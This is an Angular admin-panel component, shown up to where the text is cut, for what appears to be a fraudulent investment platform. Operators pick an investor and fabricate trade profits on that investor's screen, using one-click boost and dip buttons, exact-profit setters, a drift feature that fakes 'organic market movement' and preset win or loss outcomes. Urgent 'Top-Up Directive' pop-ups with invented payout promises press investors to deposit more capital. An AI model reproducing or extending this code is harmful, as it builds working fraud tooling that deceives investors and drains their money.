import { Component, inject, OnInit, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { RouterModule } from '@angular/router';
import { AdminService } from '../../../services/admin.service';
import { MarketService } from '../../../services/market.service';
import { StockService } from '../../../services/stock.service';
import { ToastService } from '../../../services/toast.service';

@Component({
  selector: 'app-admin-trade-controller',
  standalone: true,
  imports: [CommonModule, FormsModule, RouterModule],
  template: `
    <div class="space-y-8 font-nunito text-slate-100 selection:bg-purple-500 selection:text-white">
      
      <!-- ========================================================================= -->
      <!-- TOP BANNER & REAL-TIME SUPERVISOR HUD                                     -->
      <!-- ========================================================================= -->
      <div class="p-6 rounded-3xl bg-gradient-to-r from-[#002625] via-[#1e1435] to-[#071318] border border-purple-500/30 shadow-2xl flex flex-col md:flex-row md:items-center justify-between gap-6">
        <div class="space-y-1">
          <div class="flex items-center space-x-2">
            <span class="inline-block w-2.5 h-2.5 rounded-full bg-emerald-400 animate-ping"></span>
            <span class="text-xs font-black uppercase tracking-wider text-purple-300">Senior Broker Command Center</span>
            <span class="px-2 py-0.5 rounded-full text-[10px] font-black bg-cyan-500/20 text-cyan-300 border border-cyan-500/30">
              10/10 Broker Activity
            </span>
          </div>
          <h1 class="text-2xl sm:text-3xl font-black text-white tracking-tight">
            Multi-Asset Trading &amp; Client Capital Controller
          </h1>
          <p class="text-xs sm:text-sm text-slate-300 max-w-xl leading-relaxed">
            Trade simultaneously across multiple crypto and stock assets with user capital, push top-up directives to user screens, and alter profits in real time.
          </p>
        </div>

        <!-- Quick Stats & Live Drift Toggle -->
        <div class="flex flex-wrap items-center gap-3 shrink-0">
          <!-- Live Drift Switch -->
          <button
            type="button"
            (click)="toggleDrift()"
            class="px-3.5 py-2.5 rounded-2xl border text-xs font-bold transition flex items-center space-x-2 shadow-md"
            [ngClass]="liveDriftEnabled() ? 'bg-emerald-950/60 border-emerald-500/50 text-emerald-300' : 'bg-white/5 border-white/10 text-slate-400'"
            title="Auto-drifts active trade profits gently every 5 seconds to simulate organic market movement"
          >
            <span class="w-2.5 h-2.5 rounded-full" [ngClass]="liveDriftEnabled() ? 'bg-emerald-400 animate-ping' : 'bg-slate-500'"></span>
            <span>Live Market Drift: <strong class="uppercase">{{ liveDriftEnabled() ? 'Active (5s)' : 'Paused' }}</strong></span>
          </button>

          <div class="px-4 py-2.5 rounded-2xl bg-black/40 border border-white/10 text-center min-w-[100px]">
            <span class="text-[10px] uppercase font-bold text-slate-400 tracking-wider block">Active Trades</span>
            <span class="text-lg font-black text-white font-mono">{{ managedTrades().length }}</span>
          </div>
          <div class="px-4 py-2.5 rounded-2xl bg-purple-950/40 border border-purple-500/30 text-center min-w-[110px]">
            <span class="text-[10px] uppercase font-bold text-purple-300 tracking-wider block">Total Profits</span>
            <span class="text-lg font-black text-emerald-400 font-mono">\${{ getTotalManagedProfit() | number:'1.2-2' }}</span>
          </div>
        </div>
      </div>

      <!-- ========================================================================= -->
      <!-- TARGET USER SELECTOR BAR                                                  -->
      <!-- ========================================================================= -->
      <div class="p-4 rounded-2xl bg-[#002625] border border-white/15 flex flex-col sm:flex-row items-center justify-between gap-4 shadow-lg">
        <div class="flex items-center space-x-3 w-full sm:w-auto">
          <div class="w-10 h-10 rounded-xl bg-purple-500/20 text-purple-300 flex items-center justify-center font-black text-lg border border-purple-500/30 shrink-0">
            👤
          </div>
          <div>
            <span class="text-[11px] font-black uppercase text-slate-400 tracking-wider block">Active Client Target</span>
            <div class="text-sm font-bold text-white">Select which investor to execute trades or directives for</div>
          </div>
        </div>

        <div class="w-full sm:w-80">
          <select
            [(ngModel)]="selectedUserId"
            (ngModelChange)="onUserChange()"
            class="w-full px-4 py-2.5 rounded-xl bg-[#001c1c] border border-[#0BB4D2]/40 text-white text-xs font-bold focus:outline-none focus:border-cyan-400 transition"
          >
            <option [ngValue]="null" disabled>Choose an investor...</option>
            <option *ngFor="let u of users()" [ngValue]="u.id">
              {{ u.full_name }} ({{ u.account_id }}) - \${{ (u.wallets && u.wallets[0]?.balance) || '10000' }}
            </option>
          </select>
        </div>
      </div>

      <!-- ========================================================================= -->
      <!-- TAB NAVIGATION: BASKETS vs SINGLE TRADE vs TOP-UP DIRECTIVE               -->
      <!-- ========================================================================= -->
      <div class="flex border-b border-white/10 space-x-2 text-xs font-bold">
        <button
          type="button"
          (click)="activeTab = 'basket'"
          class="pb-3 px-4 border-b-2 transition flex items-center space-x-2"
          [ngClass]="activeTab === 'basket' ? 'border-[#0BB4D2] text-[#0BB4D2] font-black' : 'border-transparent text-slate-400 hover:text-white'"
        >
          <span>🧺</span>
          <span>Multi-Asset Portfolio Baskets (Institutional)</span>
        </button>

        <button
          type="button"
          (click)="activeTab = 'prompt'"
          class="pb-3 px-4 border-b-2 transition flex items-center space-x-2"
          [ngClass]="activeTab === 'prompt' ? 'border-amber-400 text-amber-300 font-black' : 'border-transparent text-slate-400 hover:text-white'"
        >
          <span>📢</span>
          <span>Capital Top-Up Directive Generator</span>
        </button>

        <button
          type="button"
          (click)="activeTab = 'single'"
          class="pb-3 px-4 border-b-2 transition flex items-center space-x-2"
          [ngClass]="activeTab === 'single' ? 'border-purple-400 text-purple-300 font-black' : 'border-transparent text-slate-400 hover:text-white'"
        >
          <span>⚡</span>
          <span>Single Custom Trade Launcher</span>
        </button>
      </div>

      <!-- ========================================================================= -->
      <!-- TAB 1: MULTI-ASSET PORTFOLIO BASKETS                                      -->
      <!-- ========================================================================= -->
      <div *ngIf="activeTab === 'basket'" class="space-y-6">
        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
          <div>
            <h2 class="text-lg font-black text-white flex items-center space-x-2">
              <span>🧺</span>
              <span>1-Click Multi-Asset Portfolio Baskets</span>
            </h2>
            <p class="text-xs text-slate-300">
              Deploy simultaneous positions across multiple crypto and stock assets for the investor with one click.
            </p>
          </div>
          <span class="text-xs text-cyan-300 font-mono font-bold">
            All positions will stream live into user's Live Room &amp; Earnings
          </span>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-3 gap-5">
          <div
            *ngFor="let b of predefinedBaskets"
            class="glass-panel p-5 rounded-3xl border border-white/10 hover:border-[#0BB4D2]/50 bg-[#002625]/80 space-y-4 shadow-xl relative overflow-hidden transition-all flex flex-col justify-between"
          >
            <div class="space-y-3">
              <!-- Basket Header -->
              <div class="flex items-start justify-between">
                <div>
                  <span class="text-[10px] font-black uppercase tracking-wider text-cyan-300 block">
                    Institutional Basket
                  </span>
                  <h3 class="text-base font-black text-white mt-0.5">{{ b.name }}</h3>
                </div>
                <span class="px-2.5 py-0.5 rounded-full text-[10px] font-black bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
                  +{{ b.assets.length }} Assets
                </span>
              </div>

              <p class="text-xs text-slate-300 leading-relaxed">{{ b.description }}</p>

              <!-- Asset Breakdown Pill List -->
              <div class="space-y-1.5 pt-1">
                <div *ngFor="let a of b.assets" class="p-2 rounded-xl bg-black/40 border border-white/5 flex items-center justify-between text-xs">
                  <div class="flex items-center space-x-2 font-mono">
                    <span class="text-[10px] px-1.5 py-0.2 rounded font-bold" [ngClass]="a.side === 'BUY' ? 'bg-emerald-500/20 text-emerald-300' : 'bg-rose-500/20 text-rose-300'">
                      {{ a.side }}
                    </span>
                    <span class="font-bold text-white">{{ a.pair }}</span>
                    <span class="text-slate-400 text-[11px]">({{ a.amount }})</span>
                  </div>
                  <span class="text-emerald-400 font-mono font-bold">+\${{ a.initial_profit }}</span>
                </div>
              </div>
            </div>

            <!-- Basket Launch CTA -->
            <div class="pt-3 border-t border-white/10 space-y-2">
              <div class="flex items-center justify-between text-xs">
                <span class="text-slate-400 font-bold">Total Initial Profit:</span>
                <span class="text-emerald-400 font-mono font-black text-sm">+\${{ b.totalProfit | number:'1.2-2' }}</span>
              </div>

              <button
                type="button"
                [disabled]="loading() || !selectedUserId"
                (click)="launchBasket(b)"
                class="w-full py-2.5 px-4 rounded-xl btn-cyan-gradient font-black text-xs text-[#002625] shadow-md shadow-[#0BB4D2]/20 hover:brightness-110 active:scale-95 transition disabled:opacity-50 flex items-center justify-center space-x-1.5"
              >
                <span>🚀 Launch {{ b.name }} ({{ b.assets.length }} Assets)</span>
              </button>
            </div>
          </div>
        </div>
      </div>

      <!-- ========================================================================= -->
      <!-- TAB 2: CAPITAL TOP-UP DIRECTIVE GENERATOR (CUSTOMIZABLE PROMPT)            -->
      <!-- ========================================================================= -->
      <div *ngIf="activeTab === 'prompt'" class="glass-panel p-6 sm:p-7 rounded-3xl border border-amber-500/30 bg-[#002625]/70 space-y-6 shadow-xl">
        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-white/10 pb-4">
          <div class="space-y-1">
            <h2 class="text-lg font-black text-white flex items-center space-x-2">
              <span>📢</span>
              <span>Send Top-Up Directive to User Screen</span>
            </h2>
            <p class="text-xs text-slate-300">
              Dispatches an urgent broker directive modal directly to the investor's portal screen instructing them to deposit more capital.
            </p>
          </div>
          <span class="px-3 py-1 rounded-full text-[11px] font-bold bg-amber-500/20 text-amber-300 border border-amber-500/30">
            Real-Time Push Directive
          </span>
        </div>

        <!-- 1-Click Directive Templates -->
        <div class="space-y-2">
          <span class="text-xs font-bold text-slate-300">Quick 1-Click Templates:</span>
          <div class="grid grid-cols-1 sm:grid-cols-3 gap-3">
            <button
              type="button"
              (click)="applyPromptPreset('breakout')"
              class="p-3 rounded-2xl bg-white/5 hover:bg-white/10 border border-white/10 text-left transition active:scale-98"
            >
              <div class="text-xs font-black text-amber-300">Target Breakout Booster</div>
              <div class="text-[11px] text-slate-300 mt-1">Need +$2,500 &bull; Projected Payout +$7,500</div>
            </button>

            <button
              type="button"
              (click)="applyPromptPreset('margin')"
              class="p-3 rounded-2xl bg-white/5 hover:bg-white/10 border border-white/10 text-left transition active:scale-98"
            >
              <div class="text-xs font-black text-cyan-300">Margin Buffer Directive</div>
              <div class="text-[11px] text-slate-300 mt-1">Need +$1,500 &bull; Projected Payout +$4,200</div>
            </button>

            <button
              type="button"
              (click)="applyPromptPreset('vip')"
              class="p-3 rounded-2xl bg-white/5 hover:bg-white/10 border border-rose-500/30 text-left transition active:scale-98"
            >
              <div class="text-xs font-black text-rose-300">Urgent VIP Liquidity Window</div>
              <div class="text-[11px] text-slate-300 mt-1">Need +$5,000 &bull; Projected Payout +$15,000</div>
            </button>
          </div>
        </div>

        <!-- Customizable Directive Form -->
        <form (ngSubmit)="handleSendPrompt()" class="space-y-4 pt-2">
          <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
            <!-- Title -->
            <div class="space-y-1.5 md:col-span-2">
              <label class="text-xs font-bold text-slate-300">Directive Title</label>
              <input
                type="text"
                [(ngModel)]="promptTitle"
                name="promptTitle"
                required
                class="w-full px-4 py-2.5 rounded-xl bg-[#001c1c] border border-white/15 text-white text-xs font-bold focus:outline-none focus:border-amber-400"
              />
            </div>

            <!-- Urgency -->
            <div class="space-y-1.5">
              <label class="text-xs font-bold text-slate-300">Urgency Level</label>
              <select
                [(ngModel)]="promptUrgency"
                name="promptUrgency"
                class="w-full px-3.5 py-2.5 rounded-xl bg-[#001c1c] border border-white/15 text-white text-xs font-bold focus:outline-none focus:border-amber-400"
              >
                <option value="NORMAL">🟢 Normal (Recommendation)</option>
                <option value="HIGH">🟡 High (Priority Directive)</option>
                <option value="CRITICAL">🔴 Critical (Urgent Window)</option>
              </select>
            </div>
          </div>

          <!-- Message -->
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-slate-300">Managing Broker Message / Instruction to User</label>
            <textarea
              rows="3"
              [(ngModel)]="promptMessage"
              name="promptMessage"
              required
              class="w-full px-4 py-2.5 rounded-xl bg-[#001c1c] border border-white/15 text-white text-xs leading-relaxed focus:outline-none focus:border-amber-400"
            ></textarea>
          </div>

          <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <!-- Top-Up Capital Required -->
            <div class="space-y-1.5">
              <label class="text-xs font-bold text-slate-300">Required Top-Up Capital ($)</label>
              <input
                type="number"
                step="any"
                [(ngModel)]="promptTargetAmount"
                name="promptTargetAmount"
                required
                class="w-full px-4 py-2.5 rounded-xl bg-[#001c1c] border border-white/15 text-amber-400 font-mono text-sm font-bold focus:outline-none focus:border-amber-400"
              />
            </div>

            <!-- Expected Target Payout -->
            <div class="space-y-1.5">
              <label class="text-xs font-bold text-slate-300">Projected Strategy Payout ($)</label>
              <input
                type="number"
                step="any"
                [(ngModel)]="promptExpectedPayout"
                name="promptExpectedPayout"
                required
                class="w-full px-4 py-2.5 rounded-xl bg-[#001c1c] border border-white/15 text-emerald-400 font-mono text-sm font-bold focus:outline-none focus:border-amber-400"
              />
            </div>
          </div>

          <!-- Send Directive Button -->
          <div class="flex items-center justify-end pt-2">
            <button
              type="submit"
              [disabled]="loading() || !selectedUserId"
              class="px-8 py-3 rounded-2xl bg-gradient-to-r from-amber-500 via-orange-500 to-rose-600 text-slate-950 font-black text-xs shadow-lg shadow-amber-500/25 hover:brightness-110 active:scale-95 transition disabled:opacity-50 flex items-center space-x-2"
            >
              <span>📢</span>
              <span>{{ loading() ? 'Broadcasting...' : 'Broadcast Top-Up Directive to User Screen Now' }}</span>
            </button>
          </div>
        </form>

        <!-- Active Prompts for Target User -->
        <div class="pt-4 border-t border-white/10 space-y-3" *ngIf="activePrompts().length > 0">
          <span class="text-xs font-bold text-slate-300 block">Active Directives on Record:</span>
          <div class="space-y-2">
            <div *ngFor="let p of activePrompts()" class="p-3 rounded-2xl bg-black/40 border border-white/10 flex items-center justify-between text-xs">
              <div>
                <div class="flex items-center space-x-2">
                  <span class="font-bold text-white">{{ p.title }}</span>
                  <span class="px-2 py-0.2 rounded text-[9px] font-black uppercase bg-amber-500/20 text-amber-300">
                    {{ p.urgency }}
                  </span>
                </div>
                <div class="text-[11px] text-slate-400 mt-0.5">
                  Top-Up: \${{ p.target_amount }} &bull; Projected: +\${{ p.expected_payout }} &bull; {{ p.created_at | date:'short' }}
                </div>
              </div>

              <button
                type="button"
                (click)="dismissPromptAdmin(p.id)"
                class="px-3 py-1 rounded-lg bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 border border-rose-500/30 text-[11px] font-bold transition"
              >
                Dismiss / Revoke
              </button>
            </div>
          </div>
        </div>
      </div>

      <!-- ========================================================================= -->
      <!-- TAB 3: SINGLE CUSTOM TRADE LAUNCHER                                       -->
      <!-- ========================================================================= -->
      <div *ngIf="activeTab === 'single'" class="glass-panel p-6 sm:p-7 rounded-3xl border border-white/10 space-y-6 bg-[#002625]/60 shadow-xl">
        <div class="flex items-center justify-between border-b border-white/10 pb-4">
          <div class="space-y-1">
            <h2 class="text-lg font-black text-white flex items-center space-x-2">
              <span>⚡</span>
              <span>Execute Single Custom Trade for User</span>
            </h2>
            <p class="text-xs text-slate-300">
              Open a single trade directly on the user's account. Live streaming immediately.
            </p>
          </div>
          <span class="px-3 py-1 rounded-full text-[11px] font-bold bg-purple-500/20 text-purple-300 border border-purple-500/30">
            Supervisor Action
          </span>
        </div>

        <form (ngSubmit)="handleCreateTrade()" class="space-y-5">
          <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
            <!-- Market Asset Pair -->
            <div class="space-y-1.5">
              <label class="text-xs font-bold text-slate-300">Market Asset</label>
              <select
                [(ngModel)]="selectedPair"
                name="selectedPair"
                class="w-full px-3.5 py-2.5 rounded-xl bg-[#001c1c] border border-white/15 text-cyan-300 text-xs font-mono font-bold focus:outline-none focus:border-purple-400 transition"
              >
                <optgroup label="Crypto Assets (Binance)">
                  <option value="BTC/USDT">BTC/USDT (Bitcoin)</option>
                  <option value="ETH/USDT">ETH/USDT (Ethereum)</option>
                  <option value="SOL/USDT">SOL/USDT (Solana)</option>
                  <option value="BNB/USDT">BNB/USDT (Binance Coin)</option>
                  <option value="DOGE/USDT">DOGE/USDT (Dogecoin)</option>
                </optgroup>
                <optgroup label="Wall Street Equities &amp; ETFs">
                  <option value="AAPL/USD">AAPL/USD (Apple Inc.)</option>
                  <option value="TSLA/USD">TSLA/USD (Tesla Inc.)</option>
                  <option value="NVDA/USD">NVDA/USD (NVIDIA AI)</option>
                  <option value="MSFT/USD">MSFT/USD (Microsoft)</option>
                  <option value="SPY/USD">SPY/USD (S&amp;P 500 ETF)</option>
                </optgroup>
              </select>
            </div>

            <!-- Direction -->
            <div class="space-y-1.5">
              <label class="text-xs font-bold text-slate-300">Direction</label>
              <div class="grid grid-cols-2 gap-2">
                <button
                  type="button"
                  (click)="tradeSide = 'BUY'"
                  class="py-2 px-3 rounded-xl font-black text-xs transition-all flex items-center justify-center space-x-1"
                  [ngClass]="tradeSide === 'BUY' ? 'bg-emerald-500 text-slate-950 shadow-md shadow-emerald-500/20' : 'bg-white/5 text-slate-400 hover:text-white'"
                >
                  <span>🟢 BUY (Long)</span>
                </button>
                <button
                  type="button"
                  (click)="tradeSide = 'SELL'"
                  class="py-2 px-3 rounded-xl font-black text-xs transition-all flex items-center justify-center space-x-1"
                  [ngClass]="tradeSide === 'SELL' ? 'bg-rose-500 text-white shadow-md shadow-rose-500/20' : 'bg-white/5 text-slate-400 hover:text-white'"
                >
                  <span>🔴 SELL (Short)</span>
                </button>
              </div>
            </div>

            <!-- Amount -->
            <div class="space-y-1.5">
              <label class="text-xs font-bold text-slate-300">Trade Amount / Size</label>
              <input
                type="number"
                step="any"
                [(ngModel)]="tradeAmount"
                name="tradeAmount"
                placeholder="0.25"
                required
                class="w-full px-3.5 py-2.5 rounded-xl bg-[#001c1c] border border-white/15 text-white text-xs font-mono font-bold focus:outline-none focus:border-purple-400 transition"
              />
            </div>
          </div>

          <div class="grid grid-cols-1 md:grid-cols-3 gap-4 pt-1">
            <!-- Initial Starting Profit -->
            <div class="space-y-1.5">
              <label class="text-xs font-bold text-slate-300 flex items-center justify-between">
                <span>Initial Starting Profit ($)</span>
                <span class="text-[10px] text-emerald-400 font-mono">Live on user chart</span>
              </label>
              <input
                type="number"
                step="any"
                [(ngModel)]="initialProfit"
                name="initialProfit"
                placeholder="250.00"
                class="w-full px-3.5 py-2.5 rounded-xl bg-[#001c1c] border border-white/15 text-emerald-400 text-xs font-mono font-bold focus:outline-none focus:border-purple-400 transition"
              />
            </div>

            <!-- Target Outcome -->
            <div class="space-y-1.5">
              <label class="text-xs font-bold text-slate-300">Target Outcome</label>
              <select
                [(ngModel)]="targetOutcome"
                name="targetOutcome"
                class="w-full px-3.5 py-2.5 rounded-xl bg-[#001c1c] border border-white/15 text-white text-xs font-semibold focus:outline-none focus:border-purple-400 transition"
              >
                <option value="IN_PROGRESS">🟢 Active &amp; Growing Profit</option>
                <option value="WIN">✨ Target Win (Lock in profit)</option>
                <option value="LOSS">🔻 Controlled Dip (Negative outcome)</option>
              </select>
            </div>

            <!-- Supervisor Note -->
            <div class="space-y-1.5">
              <label class="text-xs font-bold text-slate-300">Supervisor Note</label>
              <input
                type="text"
                [(ngModel)]="adminNotes"
                name="adminNotes"
                placeholder="VIP Institutional Execution"
                class="w-full px-3.5 py-2.5 rounded-xl bg-[#001c1c] border border-white/15 text-slate-300 text-xs focus:outline-none focus:border-purple-400 transition"
              />
            </div>
          </div>

          <!-- Submit Button -->
          <div class="flex items-center justify-end pt-2">
            <button
              type="submit"
              [disabled]="loading() || !selectedUserId || !tradeAmount"
              class="px-8 py-3 rounded-2xl bg-gradient-to-r from-purple-600 via-indigo-600 to-[#0BB4D2] text-white font-black text-xs shadow-lg shadow-purple-600/25 hover:brightness-110 active:scale-95 transition-all disabled:opacity-50 flex items-center space-x-2"
            >
              <span>🚀</span>
              <span>{{ loading() ? 'Executing Trade...' : 'Launch Live Managed Trade for User' }}</span>
            </button>
          </div>
        </form>
      </div>

      <!-- ========================================================================= -->
      <!-- SECTION 2: LIVE ACTIVE MANAGED TRADES & BULK/INDIVIDUAL PROFIT MANIPULATOR  -->
      <!-- ========================================================================= -->
      <div class="space-y-4">
        
        <!-- Section Header with BULK PROFIT BOOSTERS -->
        <div class="p-4 rounded-2xl bg-[#002625] border border-white/15 flex flex-col md:flex-row md:items-center justify-between gap-4 shadow-lg">
          <div>
            <h2 class="text-base font-black text-white flex items-center space-x-2">
              <span>📊</span>
              <span>Active Trades &amp; Real-Time Manipulator</span>
            </h2>
            <p class="text-xs text-slate-300">
              Adjust individual trades or use the 1-click bulk booster to add profit across all positions for this user.
            </p>
          </div>

          <!-- Bulk Boost Controls for Selected User -->
          <div class="flex items-center space-x-2 shrink-0">
            <span class="text-[10px] font-black uppercase text-amber-300 tracking-wider">Boost All Positions:</span>
            <button
              type="button"
              (click)="boostAll(50)"
              class="px-2.5 py-1.5 rounded-lg bg-emerald-950/60 hover:bg-emerald-900 text-emerald-300 border border-emerald-500/40 text-xs font-mono font-bold active:scale-95 transition"
            >
              +50 to All
            </button>
            <button
              type="button"
              (click)="boostAll(100)"
              class="px-2.5 py-1.5 rounded-lg bg-emerald-950/60 hover:bg-emerald-900 text-emerald-300 border border-emerald-500/40 text-xs font-mono font-bold active:scale-95 transition"
            >
              +100 to All
            </button>
            <button
              type="button"
              (click)="boostAll(250)"
              class="px-2.5 py-1.5 rounded-lg bg-emerald-950/60 hover:bg-emerald-900 text-emerald-300 border border-emerald-500/40 text-xs font-mono font-bold active:scale-95 transition"
            >
              +250 to All
            </button>

            <button
              type="button"
              (click)="loadManagedTrades()"
              class="p-2 rounded-lg bg-white/5 hover:bg-white/10 text-slate-300 border border-white/10 text-xs font-bold transition"
              title="Refresh Trades"
            >
              🔄
            </button>
          </div>
        </div>

        <!-- Empty State -->
        <div *ngIf="managedTrades().length === 0" class="p-12 text-center glass-panel rounded-3xl border border-white/10 space-y-3">
          <div class="w-12 h-12 rounded-2xl bg-white/5 text-2xl mx-auto flex items-center justify-center">
            📈
          </div>
          <h3 class="text-base font-bold text-white">No Managed Trades Yet</h3>
          <p class="text-xs text-slate-400 max-w-sm mx-auto">
            Use the Multi-Asset Portfolio Baskets or Single Trade Launcher above to launch trades. They will appear here with live profit adjustment controls.
          </p>
        </div>

        <!-- Cards Grid for Each Active Trade -->
        <div class="grid grid-cols-1 lg:grid-cols-2 gap-5" *ngIf="managedTrades().length > 0">
          <div
            *ngFor="let t of managedTrades()"
            class="glass-panel p-5 sm:p-6 rounded-3xl border border-white/10 space-y-4 hover:border-purple-400/40 transition-all bg-[#002625]/75 shadow-xl relative overflow-hidden"
          >
            <!-- Ambient Background Glow -->
            <div
              class="absolute -top-12 -right-12 w-32 h-32 rounded-full pointer-events-none blur-3xl opacity-20"
              [ngClass]="t.current_profit >= 0 ? 'bg-emerald-500' : 'bg-rose-500'"
            ></div>

            <!-- Card Header: User & Asset Badge -->
            <div class="flex items-start justify-between gap-3 relative z-10">
              <div>
                <div class="flex items-center space-x-2">
                  <span class="font-extrabold text-sm text-white">{{ t.full_name }}</span>
                  <span class="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-white/10 text-cyan-300">
                    {{ t.account_id }}
                  </span>
                </div>
                <div class="text-[11px] text-slate-400">{{ t.email }}</div>
              </div>

              <div class="text-right shrink-0">
                <span
                  class="px-2.5 py-1 rounded-full text-xs font-black uppercase tracking-wider inline-flex items-center space-x-1"
                  [ngClass]="t.side === 'BUY' ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30' : 'bg-rose-500/20 text-rose-300 border border-rose-500/30'"
                >
                  <span>{{ t.side === 'BUY' ? '🟢 BUY' : '🔴 SELL' }}</span>
                  <span>{{ t.pair }}</span>
                </span>
                <div class="text-[10px] text-slate-400 mt-1 font-mono">
                  Size: {{ t.amount }} | Entry: \${{ t.price | number:'1.2-2' }}
                </div>
              </div>
            </div>

            <!-- Hero Live Profit Capsule -->
            <div class="p-4 rounded-2xl bg-black/40 border border-white/10 flex items-center justify-between">
              <div>
                <span class="text-[10px] uppercase font-bold text-slate-400 tracking-wider block">Live Trader Profit</span>
                <div class="text-2xl sm:text-3xl font-black font-mono flex items-center space-x-2" [ngClass]="t.current_profit >= 0 ? 'text-emerald-400' : 'text-rose-400'">
                  <span>{{ t.current_profit >= 0 ? '+' : '' }}\${{ t.current_profit | number:'1.2-2' }}</span>
                </div>
              </div>

              <!-- Status Tag -->
              <div class="text-right">
                <span
                  class="px-2.5 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider inline-block"
                  [ngClass]="{
                    'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30': t.target_outcome === 'IN_PROGRESS' || t.target_outcome === 'WIN',
                    'bg-rose-500/20 text-rose-300 border border-rose-500/30': t.target_outcome === 'LOSS',
                    'bg-slate-700/50 text-slate-300 border border-slate-600': t.status === 'FILLED' && t.target_outcome === 'CLOSED'
                  }"
                >
                  {{ t.target_outcome === 'IN_PROGRESS' ? '🟢 Live Streaming' : t.target_outcome }}
                </span>
                <div class="text-[10px] text-slate-400 mt-1 truncate max-w-[150px]">
                  {{ t.admin_notes || 'Managed Trade' }}
                </div>
              </div>
            </div>

            <!-- Instant Delta Manipulators (1-Click +/-) -->
            <div class="space-y-1.5">
              <span class="text-[10px] uppercase font-bold text-slate-400 tracking-wider block">Quick 1-Click Profit Adjusters</span>
              <div class="grid grid-cols-5 gap-1.5 text-xs font-mono font-bold">
                <button
                  type="button"
                  (click)="adjustProfit(t.id, 25)"
                  class="py-1.5 rounded-lg bg-emerald-950/40 hover:bg-emerald-900/60 text-emerald-300 border border-emerald-500/30 active:scale-95 transition"
                >
                  +25
                </button>
                <button
                  type="button"
                  (click)="adjustProfit(t.id, 50)"
                  class="py-1.5 rounded-lg bg-emerald-950/40 hover:bg-emerald-900/60 text-emerald-300 border border-emerald-500/30 active:scale-95 transition"
                >
                  +50
                </button>
                <button
                  type="button"
                  (click)="adjustProfit(t.id, 100)"
                  class="py-1.5 rounded-lg bg-emerald-950/40 hover:bg-emerald-900/60 text-emerald-300 border border-emerald-500/30 active:scale-95 transition"
                >
                  +100
                </button>
                <button
                  type="button"
                  (click)="adjustProfit(t.id, 250)"
                  class="py-1.5 rounded-lg bg-emerald-950/40 hover:bg-emerald-900/60 text-emerald-300 border border-emerald-500/30 active:scale-95 transition"
                >
                  +250
                </button>
                <button
                  type="button"
                  (click)="adjustProfit(t.id, 500)"
                  class="py-1.5 rounded-lg bg-emerald-950/60 hover:bg-emerald-800/80 text-emerald-200 border border-emerald-400/40 active:scale-95 transition"
                >
                  +500
                </button>
              </div>

              <!-- Negative Dips -->
              <div class="grid grid-cols-5 gap-1.5 text-xs font-mono font-bold pt-1">
                <button
                  type="button"
                  (click)="adjustProfit(t.id, -25)"
                  class="py-1.5 rounded-lg bg-rose-950/40 hover:bg-rose-900/60 text-rose-300 border border-rose-500/30 active:scale-95 transition"
                >
                  -25
                </button>
                <button
                  type="button"
                  (click)="adjustProfit(t.id, -50)"
                  class="py-1.5 rounded-lg bg-rose-950/40 hover:bg-rose-900/60 text-rose-300 border border-rose-500/30 active:scale-95 transition"
                >
                  -50
                </button>
                <button
                  type="button"
                  (click)="adjustProfit(t.id, -100)"
                  class="py-1.5 rounded-lg bg-rose-950/40 hover:bg-rose-900/60 text-rose-300 border border-rose-500/30 active:scale-95 transition"
                >
                  -100
                </button>
                <button
                  type="button"
                  (click)="adjustProfit(t.id, -250)"
                  class="py-1.5 rounded-lg bg-rose-950/40 hover:bg-rose-900/60 text-rose-300 border border-rose-500/30 active:scale-95 transition"
                >
                  -250
                </button>
                <button
                  type="button"
                  (click)="adjustProfit(t.id, -500)"
                  class="py-1.5 rounded-lg bg-rose-950/60 hover:bg-rose-800/80 text-rose-200 border border-rose-400/40 active:scale-95 transition"
                >
                  -500
                </button>
              </div>
            </div>

            <!-- Custom Exact Profit & Outcome Controls -->
            <div class="pt-2 border-t border-white/10 flex flex-col sm:flex-row items-center justify-between gap-3">
              <!-- Exact Profit Input -->
              <div class="flex items-center space-x-2 w-full sm:w-auto">
                <span class="text-xs font-bold text-slate-400 font-mono">$</span>
                <input
                  #customVal
                  type="number"
                  step="any"
                  [value]="t.current_profit"
                  placeholder="Set exact $"
                  class="w-28 px-2.5 py-1.5 rounded-lg bg-[#001c1c] border border-white/15 text-white text-xs font-mono font-bold focus:outline-none focus:border-purple-400"
                />
                <button
                  type="button"
                  (click)="setExactProfit(t.id, customVal.value)"
                  class="px-2.5 py-1.5 rounded-lg bg-purple-600 hover:bg-purple-500 text-white font-bold text-xs transition"
                >
                  Set
                </button>
              </div>

              <!-- Finalize Outcomes & Deal Closing Pipeline -->
              <div class="flex flex-wrap items-center space-x-2 w-full sm:w-auto justify-end gap-1.5">
                <!-- 1. Initiate Closing Window Button -->
                <button
                  type="button"
                  *ngIf="t.target_outcome !== 'CLOSING_SOON'"
                  (click)="signalClosing(t.id)"
                  class="px-2.5 py-1.5 rounded-lg bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40 text-xs font-bold transition flex items-center space-x-1 active:scale-95"
                  title="Signal to user that deal is ending and closing window is active"
                >
                  <span>🔔 Signal Closing Soon</span>
                </button>

                <span
                  *ngIf="t.target_outcome === 'CLOSING_SOON'"
                  class="px-2.5 py-1 rounded-lg bg-amber-500/30 text-amber-200 border border-amber-400 text-[11px] font-black animate-pulse flex items-center space-x-1"
                >
                  <span>⏳ Closing in Progress</span>
                </span>

                <!-- 2. Final Settlement Win -->
                <button
                  type="button"
                  (click)="closeWithOutcome(t.id, 'WIN')"
                  class="px-3 py-1.5 rounded-lg bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300 border border-emerald-500/40 text-xs font-black transition flex items-center space-x-1 active:scale-95"
                  title="Lock in profit and credit directly to user's universal USD cash wallet"
                >
                  <span>✨ Close &amp; Credit Cash</span>
                </button>

                <!-- 3. Close Loss -->
                <button
                  type="button"
